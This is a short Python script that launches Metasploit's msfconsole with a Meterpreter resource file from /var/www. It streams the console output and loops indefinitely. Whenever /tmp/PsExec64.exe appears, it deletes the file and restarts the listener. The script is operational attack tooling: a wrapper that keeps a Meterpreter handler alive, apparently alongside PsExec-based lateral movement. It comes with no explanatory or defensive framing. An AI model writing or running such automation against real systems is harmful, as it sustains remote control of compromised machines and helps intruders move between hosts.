#!/usr/bin/python

import sys
import subprocess
import os
import time

def main(argv):

    process = startProcess()

    while True:
        process = stopProcess(process)
        checkProcess(process)


def startProcess():
    process = subprocess.Popen(['msfconsole', '-r', '/var/www/meterpreter.rc'],
                     stdout=subprocess.PIPE,
                     universal_newlines=True)

    return process


def checkProcess(process):
    try:
        output = process.stdout.readline()
        print(output.strip())
    except KeyboardInterrupt:
        try:
            process.terminate()
        except OSError:
            pass


def stopProcess(process):
    if os.path.isfile('/tmp/PsExec64.exe'):
        os.remove('/tmp/PsExec64.exe')
        time.sleep(10)
        process.terminate()
        process = subprocess.Popen(['msfconsole', '-r', '/var/www/meterpreter.rc'],
                     stdout=subprocess.PIPE,
                     universal_newlines=True)
    return process


if __name__ == "__main__":
    main(sys.argv)
